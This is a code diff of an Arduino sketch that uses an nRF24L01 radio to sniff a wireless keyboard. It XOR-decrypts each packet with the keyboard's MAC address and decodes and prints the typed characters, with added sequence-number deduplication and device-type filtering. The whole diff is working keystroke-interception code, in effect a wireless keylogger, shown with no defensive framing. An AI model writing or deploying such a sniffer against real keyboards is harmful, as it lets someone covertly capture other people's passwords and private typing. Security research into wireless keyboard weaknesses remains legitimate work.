@@ -3,6 +3,7 @@
 #include "mhid.h"
 #include "nRF24L01.h"
 #include "RF24.h"
+#include "printf.h"
 
 #define RADIO_CE_PIN 9
 #define RADIO_CSN_PIN 10
@@ -10,9 +11,11 @@
 #define EEPROM_LAST_CHANNEL_VALUE_ADDRESS  0x05 
 #define PACKET_SIZE 16
 
-uint8_t channel = 3; 
-uint64_t keyboard_mac_address = 0xA93ED4A2CD; 
+uint8_t channel = 72; 
+uint64_t keyboard_mac_address = 0;//0xA93ED4A2CD; 
 RF24 radio(RADIO_CE_PIN, RADIO_CSN_PIN);
+char last_character_received = '\0';
+uint16_t lastSeq = 0;
 
 void decrypt_packet(uint8_t* p)
 {
@@ -21,23 +24,25 @@ void decrypt_packet(uint8_t* p)
     p[i] ^= keyboard_mac_address >> (((i - 4) % 5) * 8) & 0xFF;
 }
 
-char process_keystroke(uint8_t* p)
+void process_keystroke(uint8_t* p)
 {
   char letter;
-  uint8_t key = p[9];
-  // Unsure why original code had this. This is to isolate this data.
-  uint8_t unknown_data = p[11] ? p[11] : p[10];
-  if(unknown_data)
-  {
-    Serial.print("Unknown data: ");
-    Serial.print(unknown_data);
-    Serial.println(".");
-  }
+  uint8_t key = p[11] ? p[11] : p[10] ? p[10] : p[9];
   uint8_t meta = p[7];
   letter = hid_decode(key, meta);
-  Serial.print("CHAR: ");
-  Serial.println(letter);
-  return letter;
+  if(lastSeq == (p[5] << 8) + p[4])
+  {
+    Serial.print(" IGNORED: ");
+    Serial.print(letter);
+    return;
+  }
+  Serial.print(" CHAR: ");
+  Serial.print(letter);
+  Serial.print(" (");
+  Serial.print(key, HEX);
+  Serial.print(")");
+  lastSeq = (p[5] << 8) + p[4];
+  last_character_received = letter;
 }
 
 uint8_t flush_rx(void)
@@ -61,23 +66,25 @@ uint8_t write_to_nrf24l01_register(uint8_t reg, uint8_t value)
 
 void debug_print_packet(uint8_t* p)
 {
-  Serial.println("-PKT START-");
+  //Serial.println("-PKT START-");
+  //for (int j = 0; j < PACKET_SIZE; j++)
+  //{
+  //  Serial.print(" ");
+  //  Serial.print(j);
+  //  if(j < 10) Serial.print(" ");
+  //  Serial.print(" |");
+ //}
+ Serial.println("");
+ Serial.print(millis());
+ Serial.print(" | ");
   for (int j = 0; j < PACKET_SIZE; j++)
   {
     Serial.print(" ");
-    Serial.print(j);
-    if(j < 10) Serial.print(" ");
-    Serial.print(" |");
-  }
-  Serial.println("");
-  for (int j = 0; j < PACKET_SIZE; j++)
-  {
-    Serial.print(" ");
+    if(p[j] <= 0xF) Serial.print(" ");
     Serial.print(p[j], HEX);
     Serial.print(" |");
   }
-  Serial.println("");
-  Serial.println("-PKT END-");
+ // Serial.println("-PKT END-");
 }
 
 void scan()
@@ -156,6 +163,8 @@ void scan()
 void setup()
 {
   Serial.begin(SERIAL_BAUDRATE);
+  printf_begin();
+  Serial.println("Starting.");
   radio.begin();
   channel = EEPROM.read(EEPROM_LAST_CHANNEL_VALUE_ADDRESS);
   radio.setAutoAck(false);
@@ -198,19 +207,21 @@ void loop(void)
         }
         last_packet[j] = current_packet[j];
       }
-      if (is_the_same_as_the_last_packet) return;
-      
-      decrypt_packet(current_packet);  
-      debug_print_packet(current_packet);
-      
-      // Check if the device type is 0x0A which is a keyboard. Then check if the HID code is not 0.
-      if (current_packet[0] == 0x0A && current_packet[9] != 0)
-      {
-        process_keystroke(current_packet);
-      }
+      if (is_the_same_as_the_last_packet)
+     {
+       Serial.println("");
+       Serial.print("Duplicate packet sent. Ignoring.");
+       return;
+     }
     }
     
-    decrypt_packet(current_packet);  
+    decrypt_packet(current_packet);
     debug_print_packet(current_packet);
+      
+    // Check if the device type is 0x0A which is a keyboard. Then check if the HID code is not 0.
+    if (current_packet[0] == 0x0A && current_packet[1] == 0x78 && current_packet[9] != 0)
+    {
+      process_keystroke(current_packet);
+    }
   }
 }
